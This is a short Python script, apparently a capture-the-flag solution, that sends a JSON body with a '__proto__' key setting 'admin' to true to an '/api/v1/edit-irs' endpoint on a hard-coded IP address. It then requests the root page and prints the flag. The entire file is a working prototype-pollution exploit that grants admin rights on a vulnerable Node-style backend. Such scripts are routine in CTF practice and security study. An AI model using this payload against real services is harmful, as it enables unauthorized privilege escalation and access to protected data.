import httpx
import asyncio

URL = 'http://34.101.249.193:49086'

class BaseAPI():
	def __init__(self,url=URL):
		self.c = httpx.AsyncClient(base_url=url)

	def visit(self, path, data):
		return self.c.post(path,json=data)

class API(BaseAPI):
	def get_flag(self):
		return self.c.get('/')

async def main():
	api = API()
	data = {
		"DSA": {
		    "name": "DSA",
		    "cost": 3,
		    "available": True,
		    "taken": True,
		},
		"__proto__": {
        	"admin": True,
    	}
    }
	res = await api.visit('/api/v1/edit-irs',data)
	flag = await api.get_flag()
	print(flag.text)

if __name__ == '__main__':
	asyncio.run(main())